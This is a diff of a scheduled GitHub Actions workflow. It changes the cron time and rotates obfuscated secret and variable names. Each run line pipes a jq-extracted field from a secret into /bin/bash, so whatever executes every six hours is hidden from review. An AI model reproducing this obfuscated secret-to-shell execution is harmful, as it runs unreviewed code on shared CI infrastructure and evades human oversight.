@@ -2,7 +2,8 @@ name: qingtongqingong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '32 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,24 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: qingtongqingong
         env:
-          wz76918: ${{ secrets.wz76918 }}
+          yohy81173: ${{ secrets.yohy81173 }}
         run: |
-          echo $wz76918 | jq -r .awn74893 | /bin/bash
-          echo $t398 | jq -r .sheh0266 | /bin/bash
-          echo $xjc936 | jq -r .dg867 | /bin/bash
-          echo $eca137 | jq -r .eeor2 | /bin/bash
-          echo $db33644 | jq -r .k3 | /bin/bash
-          echo $mn088 | jq -r .dwwpn6 | /bin/bash
-          echo $s730 | jq -r .oqhq157 | /bin/bash
-          echo $lvaf4 | jq -r .qbqtw51891 | /bin/bash
-          echo $gbnkd4 | jq -r .w5460 | /bin/bash
-          echo $pft4332 | jq -r .qec77 | /bin/bash
-          echo $a35 | jq -r .dmhd30 | /bin/bash
-          echo $aldo3473 | jq -r .uyfv8 | /bin/bash
-          echo $f89769 | jq -r .do73100 | /bin/bash
-          echo $cg5160 | jq -r .qncq2 | /bin/bash
-          echo $nrxs93366 | jq -r .sam5 | /bin/bash
-          echo $ry731 | jq -r .cs83 | /bin/bash
-          echo $e92497 | jq -r .sxsgw15 | /bin/bash
-          echo $iiwy24393 | jq -r .o5875 | /bin/bash
+          echo $yohy81173 | jq -r .x5414 | /bin/bash
+          echo $yk685 | jq -r .yukl99 | /bin/bash
+          echo $bzpad44 | jq -r .crfld7 | /bin/bash
+          echo $pg93829 | jq -r .f376 | /bin/bash
+          echo $f99 | jq -r .e960 | /bin/bash
+          echo $j51 | jq -r .qrxvm16 | /bin/bash
+          echo $muxu85903 | jq -r .psfy129 | /bin/bash
+          echo $bbnph8 | jq -r .wmv616 | /bin/bash
+          echo $lz34263 | jq -r .oicw28013 | /bin/bash
+          echo $typo0 | jq -r .n85612 | /bin/bash
+          echo $j920 | jq -r .w25355 | /bin/bash
 
